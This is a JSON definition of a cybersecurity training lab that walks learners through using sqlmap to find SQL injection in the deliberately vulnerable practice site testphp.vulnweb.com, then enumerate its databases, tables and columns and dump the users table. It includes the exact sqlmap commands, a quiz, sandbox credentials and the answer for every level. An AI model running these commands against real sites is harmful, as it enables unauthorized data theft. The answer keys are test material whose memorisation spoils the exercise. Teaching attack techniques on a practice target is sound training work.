{
  "title" : "Uploaded LAB 13 - Exploiting SQL with sqlmap",
  "description" : "Using sqlmap to exploit SQL and Database.",
  "prerequisites" : [ "Prepare lession for SQL and Database." ],
  "outcomes" : [ "Know how to exploit SQL and Database." ],
  "state" : "UNRELEASED",
  "show_stepper_bar" : true,
  "levels" : [ {
    "title" : "Introduction",
    "level_type" : "INFO_LEVEL",
    "order" : 0,
    "estimated_duration" : 0,
    "minimal_possible_solve_time" : null,
    "content" : "Welcome to Lab 13 of our HOD Labs training series. In this lesson, we will focus on using a powerful tool called sqlmap to exploit SQL vulnerabilities in web applications. Specifically, we will demonstrate how to leverage sqlmap to exploit SQL injection vulnerabilities in the webpage http://testphp.vulnweb.com/.\n\nSQL injection is a common web application vulnerability that occurs when an attacker can manipulate an application's SQL queries through user inputs. This can lead to unauthorized access, data leakage, and even the complete compromise of a website and its underlying database.\n\nSqlmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws. It provides a comprehensive set of features for identifying and exploiting SQL vulnerabilities in a web application, allowing penetration testers to assess the security of their target systems effectively.\n\nBy the end of this lab, you will have a solid understanding of how to utilize sqlmap to identify and exploit SQL injection vulnerabilities in a web application. We will specifically target the test website http://testphp.vulnweb.com/ to demonstrate various techniques and functionalities of sqlmap.\n\nPrerequisites:\nBefore diving into this lab, it is essential to have a basic understanding of SQL (Structured Query Language) and web application vulnerabilities like SQL injection. Familiarity with the HTTP protocol and web requests will also be beneficial. Additionally, ensure that you have sqlmap installed on your system.\n\n## Lab Objectives:\n\nIn this lab, you will learn the basics of sqlmap and its capabilities.\nUnderstand how to use sqlmap to identify SQL injection vulnerabilities in a target web application.\nExplore different sqlmap options and techniques for exploiting SQL injection vulnerabilities.\nExecute sqlmap commands to extract data, enumerate databases, and perform other tasks on the target website http://testphp.vulnweb.com/.\n\n## Lab Environment:\nWe will be using the webpage http://testphp.vulnweb.com/ as our target throughout this lab. It is a deliberately vulnerable web application designed for educational purposes. Remember to only perform these actions within the controlled environment of this lab and avoid any unauthorized activities.\n\nLet's get started with exploiting SQL using sqlmap and uncover the hidden vulnerabilities in the target web application!"
  }, {
    "title" : "Quick Knowledge Test",
    "level_type" : "ASSESSMENT_LEVEL",
    "order" : 1,
    "estimated_duration" : 8,
    "minimal_possible_solve_time" : null,
    "questions" : [ {
      "question_type" : "MCQ",
      "text" : "What is the purpose of sqlmap?",
      "points" : 5,
      "penalty" : 5,
      "order" : 0,
      "answer_required" : true,
      "choices" : [ {
        "text" : "To automate SQL injection attacks",
        "correct" : true,
        "order" : 0
      }, {
        "text" : "To prevent SQL injection vulnerabilities",
        "correct" : false,
        "order" : 1
      }, {
        "text" : "To encrypt SQL queries",
        "correct" : false,
        "order" : 2
      }, {
        "text" : "To generate random SQL statements",
        "correct" : false,
        "order" : 3
      } ]
    }, {
      "question_type" : "MCQ",
      "text" : "Which vulnerability does sqlmap primarily target?",
      "points" : 5,
      "penalty" : 5,
      "order" : 1,
      "answer_required" : true,
      "choices" : [ {
        "text" : "Cross-Site Scripting (XSS)",
        "correct" : false,
        "order" : 0
      }, {
        "text" : "Cross-Site Request Forgery (CSRF)",
        "correct" : false,
        "order" : 1
      }, {
        "text" : "Structured Query Language (SQL) injection",
        "correct" : true,
        "order" : 2
      }, {
        "text" : "Remote Code Execution (RCE)",
        "correct" : false,
        "order" : 3
      } ]
    }, {
      "question_type" : "MCQ",
      "text" : "What is the main advantage of using sqlmap?",
      "points" : 5,
      "penalty" : 5,
      "order" : 2,
      "answer_required" : true,
      "choices" : [ {
        "text" : "It can detect all types of web vulnerabilities.",
        "correct" : false,
        "order" : 0
      }, {
        "text" : "It can bypass firewalls and intrusion detection systems.",
        "correct" : false,
        "order" : 1
      }, {
        "text" : "It automates the process of finding and exploiting SQL injection flaws.",
        "correct" : true,
        "order" : 2
      }, {
        "text" : "It provides real-time alerts for potential SQL injection attacks.",
        "correct" : false,
        "order" : 3
      } ]
    }, {
      "question_type" : "MCQ",
      "text" : "Which web application will be targeted in this lab?",
      "points" : 5,
      "penalty" : 5,
      "order" : 3,
      "answer_required" : true,
      "choices" : [ {
        "text" : "http://testphp.vulnweb.com/",
        "correct" : true,
        "order" : 0
      }, {
        "text" : "https://fap.fpt.edu.vn/",
        "correct" : false,
        "order" : 1
      }, {
        "text" : "https://ptpscheme.com/",
        "correct" : false,
        "order" : 2
      }, {
        "text" : "https://chat.openai.com/",
        "correct" : false,
        "order" : 3
      } ]
    }, {
      "question_type" : "MCQ",
      "text" : "What are the prerequisites for this lab?",
      "points" : 5,
      "penalty" : 5,
      "order" : 4,
      "answer_required" : true,
      "choices" : [ {
        "text" : "Basic knowledge of SQL and web application vulnerabilities.",
        "correct" : true,
        "order" : 0
      }, {
        "text" : "Familiarity with sqlmap commands and options.",
        "correct" : false,
        "order" : 1
      }, {
        "text" : "A functioning SQL injection scanner.",
        "correct" : false,
        "order" : 2
      }, {
        "text" : "Experience in writing secure web applications.",
        "correct" : false,
        "order" : 3
      } ]
    } ],
    "instructions" : "Answer questions then go to next level.",
    "assessment_type" : "TEST"
  }, {
    "title" : "Get Access",
    "level_type" : "ACCESS_LEVEL",
    "order" : 2,
    "estimated_duration" : 0,
    "minimal_possible_solve_time" : null,
    "passkey" : "start-training",
    "cloud_content" : "For accessing KYPO virtual machines using your local command-line tool, click on `Get SSH access` button to download ZIP file and then follow the instructions in the [documentation](https://docs.crp.kypo.muni.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access). When you are ready to advance to the next phase, submit the answer provided by the organizer.\nOr right-click on the selected network node (host or router) in the network topology will open the menu with the following options :\n\nOpen console: Opens the command-line interface (CLI) in Apache Guacamole application using the SSH protocol. This option is available only for routers and hosts with Linux-based operating systems.\n\nOpen console (deprecated): Opens web browser-based user interface using Spice client. This option is available for all routers and hosts, but it doesnâ€™t support the Copy & paste feature, and the response from the machine may be slow, so it seems that the console is freezing. Therefore it was marked as deprecated and we recommend using the other options to access the sandbox node.\n\nOpen GUI: Opens graphical user interface (GUI) in Apache Guacamole application using the VNC or RDP protocol. This option can be available for all routers and hosts but depends on whether they are properly configured.\n\n# Switch to user:**`client`** and password:**`password`** to proceed the lab.",
    "local_content" : "Before proceeding further, you need to start a sandbox on your machine. \nPlease clone [this Gitlab repository](https://<link_to_a_repo>) and follow steps in the README file.\nWhen your sandbox is ready at your host, submit the passkey from the README file."
  }, {
    "title" : "Identify SQL injection vulnerability",
    "level_type" : "TRAINING_LEVEL",
    "order" : 3,
    "estimated_duration" : 10,
    "minimal_possible_solve_time" : null,
    "answer" : "mysql",
    "answer_variable_name" : null,
    "content" : "# Guide:\n1. Navigate to the sqlmap-dev folder\n2. Target the vulnerable website (http://testphp.vulnweb.com/search.php?test=query)\n3. Identify SQL injection vulnerability\n* In the terminal or command prompt, enter the following command: \n\n`python3 sqlmap.py -u \"http://testphp.vulnweb.com/search.php?test=query\"`\n\nThis command instructs sqlmap to analyze the provided URL for SQL injection vulnerabilities.\n\n## Q: What is the name of DBMS you have found that this website using? (lowercase)",
    "solution" : "mysql",
    "solution_penalized" : true,
    "hints" : [ ],
    "incorrect_answer_limit" : 10,
    "attachments" : [ ],
    "max_score" : 15,
    "variant_answers" : false,
    "reference_solution" : [ ],
    "mitre_techniques" : [ ],
    "expected_commands" : [ ],
    "commands_required" : false
  }, {
    "title" : "Enumerate databases",
    "level_type" : "TRAINING_LEVEL",
    "order" : 4,
    "estimated_duration" : 10,
    "minimal_possible_solve_time" : null,
    "answer" : "acuart",
    "answer_variable_name" : null,
    "content" : "# In the terminal or command prompt, enter the following command:\n\n`python3 sqlmap.py -u \"http://testphp.vulnweb.com/search.php?test=query\" -dbs`\n\nThis command tells sqlmap to enumerate the databases available in the target website.\n\n## Q: What is the first row dbs name have you found after scan? (lowercase)",
    "solution" : "acuart",
    "solution_penalized" : true,
    "hints" : [ ],
    "incorrect_answer_limit" : 10,
    "attachments" : [ ],
    "max_score" : 15,
    "variant_answers" : false,
    "reference_solution" : [ ],
    "mitre_techniques" : [ ],
    "expected_commands" : [ ],
    "commands_required" : false
  }, {
    "title" : "Enumerate tables",
    "level_type" : "TRAINING_LEVEL",
    "order" : 5,
    "estimated_duration" : 10,
    "minimal_possible_solve_time" : null,
    "answer" : "users",
    "answer_variable_name" : null,
    "content" : "# In the terminal or command prompt, enter the following command:\n\n`python3 sqlmap.py -u \"http://testphp.vulnweb.com/search.php?test=query\" --tables -D acuart`\n\nHere, sqlmap will enumerate the tables in the \"acuart\" database of the target website.\n\n## Q: What is the last row table name have you found after scan? (lowercase)",
    "solution" : "users",
    "solution_penalized" : true,
    "hints" : [ ],
    "incorrect_answer_limit" : 10,
    "attachments" : [ ],
    "max_score" : 15,
    "variant_answers" : false,
    "reference_solution" : [ ],
    "mitre_techniques" : [ ],
    "expected_commands" : [ ],
    "commands_required" : false
  }, {
    "title" : "Enumerate columns",
    "level_type" : "TRAINING_LEVEL",
    "order" : 6,
    "estimated_duration" : 10,
    "minimal_possible_solve_time" : null,
    "answer" : "mediumtext",
    "answer_variable_name" : null,
    "content" : "# In the terminal or command prompt, enter the following command:\n\n`python3 sqlmap.py -u \"http://testphp.vulnweb.com/search.php?test=query\" --columns -D acuart -T users`\n\nThis command instructs sqlmap to enumerate the columns in the \"users\" table of the \"acuart\" database.\n\n## Q: What is the type of the 'address' column have you found in table users? (lowercase)",
    "solution" : "mediumtext",
    "solution_penalized" : true,
    "hints" : [ ],
    "incorrect_answer_limit" : 10,
    "attachments" : [ ],
    "max_score" : 15,
    "variant_answers" : false,
    "reference_solution" : [ ],
    "mitre_techniques" : [ ],
    "expected_commands" : [ ],
    "commands_required" : false
  }, {
    "title" : "Dump data",
    "level_type" : "TRAINING_LEVEL",
    "order" : 7,
    "estimated_duration" : 10,
    "minimal_possible_solve_time" : null,
    "answer" : "test-test",
    "answer_variable_name" : null,
    "content" : "# In the terminal or command prompt, enter the following command:\n\n`python3 sqlmap.py -u \"http://testphp.vulnweb.com/search.php?test=query\" --dump -D acuart -T users`\n\nsqlmap will now extract and display the data from the \"users\" table of the \"acuart\" database.\n\n## Q: What is the username and password have you found out? (lowercase) (Format: username-password)",
    "solution" : "test-test",
    "solution_penalized" : true,
    "hints" : [ ],
    "incorrect_answer_limit" : 10,
    "attachments" : [ ],
    "max_score" : 15,
    "variant_answers" : false,
    "reference_solution" : [ ],
    "mitre_techniques" : [ ],
    "expected_commands" : [ ],
    "commands_required" : false
  } ],
  "estimated_duration" : 58,
  "variant_sandboxes" : false
}